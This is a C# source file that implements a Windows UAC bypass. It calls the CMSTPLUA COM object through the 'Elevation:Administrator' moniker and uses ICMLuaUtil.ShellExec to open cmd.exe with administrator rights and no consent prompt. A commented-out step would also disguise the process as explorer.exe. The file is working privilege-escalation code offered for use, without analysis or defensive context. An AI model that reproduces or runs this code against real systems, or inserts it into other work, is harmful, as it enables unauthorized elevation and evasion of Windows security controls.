using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace BypassUAC_csharp
{
    public static class BypassUAC_csharp
    {
        internal enum HRESULT : long
        {
            S_FALSE = 0x0001,
            S_OK = 0x0000,
            E_INVALIDARG = 0x80070057,
            E_OUTOFMEMORY = 0x8007000E
        }

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
        [return: MarshalAs(UnmanagedType.Interface)]
        internal static extern object CoGetObject(
           string pszName,
           [In] ref BIND_OPTS3 pBindOptions,
           [In, MarshalAs(UnmanagedType.LPStruct)] Guid riid);


        [StructLayout(LayoutKind.Sequential)]
        internal struct BIND_OPTS3
        {
            internal uint cbStruct;
            internal uint grfFlags;
            internal uint grfMode;
            internal uint dwTickCountDeadline;
            internal uint dwTrackFlags;
            internal uint dwClassContext;
            internal uint locale;
            object pServerInfo; // will be passing null, so type doesn't matter
            internal IntPtr hwnd;
        }
        [Flags]
        internal enum CLSCTX
        {
            CLSCTX_INPROC_SERVER = 0x1,
            CLSCTX_INPROC_HANDLER = 0x2,
            CLSCTX_LOCAL_SERVER = 0x4,
            CLSCTX_REMOTE_SERVER = 0x10,
            CLSCTX_NO_CODE_DOWNLOAD = 0x400,
            CLSCTX_NO_CUSTOM_MARSHAL = 0x1000,
            CLSCTX_ENABLE_CODE_DOWNLOAD = 0x2000,
            CLSCTX_NO_FAILURE_LOG = 0x4000,
            CLSCTX_DISABLE_AAA = 0x8000,
            CLSCTX_ENABLE_AAA = 0x10000,
            CLSCTX_FROM_DEFAULT_CONTEXT = 0x20000,
            CLSCTX_INPROC = CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER,
            CLSCTX_SERVER = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
            CLSCTX_ALL = CLSCTX_SERVER | CLSCTX_INPROC_HANDLER
        }

        public static object LaunchElevatedCOMObject(Guid Clsid, Guid InterfaceID)
        {
            string CLSID = Clsid.ToString("B"); // B formatting directive: returns {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} 
            string monikerName = "Elevation:Administrator!new:" + CLSID;

            BIND_OPTS3 bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(bo);
            bo.hwnd = IntPtr.Zero;
            bo.dwClassContext = (int)CLSCTX.CLSCTX_LOCAL_SERVER;

            object retVal = CoGetObject(monikerName, ref bo, InterfaceID);

            return (retVal);
        }

        const ulong SEE_MASK_DEFAULT = 0x0;
        const ulong SW_SHOW = 0x5;

        public static void BypassUAC()
        {
            // CLSID
            Guid classId_cmstplua = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
            // Interface ID
            Guid interfaceId_icmluautil = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

            ICMLuaUtil icm = (ICMLuaUtil)LaunchElevatedCOMObject(classId_cmstplua, interfaceId_icmluautil); ;
            icm.ShellExec(@"C:\windows\system32\cmd.exe", null, null, SEE_MASK_DEFAULT, SW_SHOW);
            Marshal.ReleaseComObject(icm);
        }

        public static void Main()
        {
            //if(!PEBMasq.MasqueradePEB(@"C:\Windows\explorer.exe"))
            //{
            //    MessageBox.Show("MasqPEB failed!");
            //    System.Environment.Exit(0);
            //}
            MessageBox.Show("Pass ok continue!");
            BypassUAC();
        }

        //[ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsDual)]
        [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface ICMLuaUtil
        {
            //[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            //void QueryInterface([In, MarshalAs(UnmanagedType.LPStruct)] Guid riid, [In, Out] ref IntPtr ppv);
            //[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            //void AddRef();
            //[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            //void Release();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method1();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method2();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method3();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method4();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method5();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method6();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            HRESULT ShellExec(
                [In, MarshalAs(UnmanagedType.LPWStr)]string file,
                [In, MarshalAs(UnmanagedType.LPWStr)]string paramaters,
                [In, MarshalAs(UnmanagedType.LPWStr)]string directory,
                [In]ulong fMask,
                [In]ulong nShow);
        }
    }
}
